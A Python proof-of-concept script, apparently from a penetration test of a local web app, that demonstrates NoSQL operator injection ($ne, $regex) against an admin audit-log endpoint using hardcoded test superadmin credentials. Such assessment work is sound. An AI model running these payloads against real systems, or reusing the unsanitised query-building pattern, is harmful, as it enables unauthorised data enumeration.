#!/usr/bin/env python3
"""
WSTG-INPV-06: NoSQL Injection in Audit Log

Vulnerability: GET /api/admin/audit-log passes query parameters directly
to MongoDB's find() operation in admin.service.js. The getAuditLog function
builds a MongoDB query object from user-supplied parameters:

    if (user_id) query.user_id = user_id;
    if (action) query.action = action;
    if (start_date || end_date) {
        query.created_at = {};
        if (start_date) query.created_at.$gte = new Date(start_date);
        if (end_date) query.created_at.$lte = new Date(end_date);
    }

When Express parses query strings like ?action[$ne]=logout, it creates
objects: { action: { "$ne": "logout" } }. This is passed directly to
MongoDB, allowing NoSQL operator injection.

The endpoint requires superadmin role, but this PoC demonstrates the
injection technique is possible once authenticated as superadmin.

Impact: Bypass query filters, extract data that should be filtered out,
enumerate sensitive audit log entries using $regex and $ne operators.
"""

import requests
import sys

BASE_URL = "http://localhost:3000"
SUPERADMIN_ACCOUNTS = [
    {"email": "alice.admin@hireflow.com", "password": "password123"},
]


def try_login(accounts):
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            return resp.json()["token"], resp.json()["user"]
    print("    ERROR: No superadmin account could be logged in.")
    sys.exit(1)


def main():
    print("=" * 70)
    print("WSTG-INPV-06: NoSQL Injection in GET /api/admin/audit-log")
    print("=" * 70)

    # Step 1: Login as superadmin
    print("\n[1] Logging in as superadmin...")
    token, user = try_login(SUPERADMIN_ACCOUNTS)
    headers = {"Authorization": f"Bearer {token}"}
    print(f"    User: {user['email']} (role: {user['role']})")

    # Step 2: Normal audit log query
    print("\n[2] Normal audit log query...")
    resp = requests.get(
        f"{BASE_URL}/api/admin/audit-log",
        headers=headers,
        params={"limit": 5}
    )
    print(f"    Status: {resp.status_code}")
    if resp.status_code == 200:
        data = resp.json()
        logs = data.get("logs", [])
        total = data.get("pagination", {}).get("total", 0)
        print(f"    Total log entries: {total}")
        for log in logs[:3]:
            print(f"    - Action: {log.get('action', 'N/A')}, User: {log.get('user_id', 'N/A')[:8]}...")
    else:
        print(f"    Response: {resp.text[:200]}")

    # Step 3: NoSQL injection with $ne operator to bypass action filter
    print("\n[3] NoSQL injection: action[$ne] to get all actions except one...")
    resp_ne = requests.get(
        f"{BASE_URL}/api/admin/audit-log",
        headers=headers,
        params={
            "action[$ne]": "nonexistent_action",
            "limit": 10
        }
    )
    print(f"    Status: {resp_ne.status_code}")
    if resp_ne.status_code == 200:
        data = resp_ne.json()
        logs = data.get("logs", [])
        total = data.get("pagination", {}).get("total", 0)
        print(f"    [VULNERABLE] $ne injection returned {total} entries!")
        actions_seen = set()
        for log in logs:
            actions_seen.add(log.get("action", "N/A"))
        print(f"    Actions found: {actions_seen}")
    else:
        print(f"    Response: {resp_ne.text[:200]}")

    # Step 4: $regex injection to search for patterns
    print("\n[4] NoSQL injection: action[$regex] to search patterns...")
    resp_regex = requests.get(
        f"{BASE_URL}/api/admin/audit-log",
        headers=headers,
        params={
            "action[$regex]": ".*password.*",
            "limit": 10
        }
    )
    print(f"    Status: {resp_regex.status_code}")
    if resp_regex.status_code == 200:
        data = resp_regex.json()
        logs = data.get("logs", [])
        total = data.get("pagination", {}).get("total", 0)
        print(f"    [VULNERABLE] $regex injection returned {total} entries!")
        for log in logs[:5]:
            print(f"    - Action: {log.get('action')}, User: {log.get('user_id', 'N/A')[:8]}...")
            if log.get("metadata"):
                print(f"      Metadata: {str(log.get('metadata', ''))[:100]}")
    else:
        print(f"    Response: {resp_regex.text[:200]}")

    # Step 5: $ne on user_id to get all users' logs
    print("\n[5] NoSQL injection: user_id[$ne] to bypass user filter...")
    resp_user = requests.get(
        f"{BASE_URL}/api/admin/audit-log",
        headers=headers,
        params={
            "user_id[$ne]": "00000000-0000-0000-0000-000000000000",
            "limit": 10
        }
    )
    print(f"    Status: {resp_user.status_code}")
    if resp_user.status_code == 200:
        data = resp_user.json()
        total = data.get("pagination", {}).get("total", 0)
        logs = data.get("logs", [])
        print(f"    [VULNERABLE] user_id[$ne] injection returned {total} entries!")
        user_ids = set()
        for log in logs:
            uid = log.get("user_id", "")
            if uid:
                user_ids.add(str(uid)[:8])
        print(f"    Unique user IDs (prefix): {user_ids}")
    else:
        print(f"    Response: {resp_user.text[:200]}")

    # Step 6: $gt/$lt operators on dates
    print("\n[6] NoSQL injection: created_at with $gt operator...")
    resp_date = requests.get(
        f"{BASE_URL}/api/admin/audit-log",
        headers=headers,
        params={
            "start_date": "2020-01-01",
            "end_date": "2030-12-31",
            "limit": 5
        }
    )
    print(f"    Status: {resp_date.status_code}")
    if resp_date.status_code == 200:
        data = resp_date.json()
        total = data.get("pagination", {}).get("total", 0)
        print(f"    Date range query returned {total} entries")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: NoSQL injection confirmed in /api/admin/audit-log.")
    print("  - Query parameters passed directly to MongoDB find()")
    print("  - Express query string parsing creates operator objects")
    print("  - $ne, $regex, $gt, $lt operators can be injected")
    print("  - Allows bypassing intended query filters")
    print("  - Can enumerate all audit log entries and metadata")
    print("=" * 70)


if __name__ == "__main__":
    main()
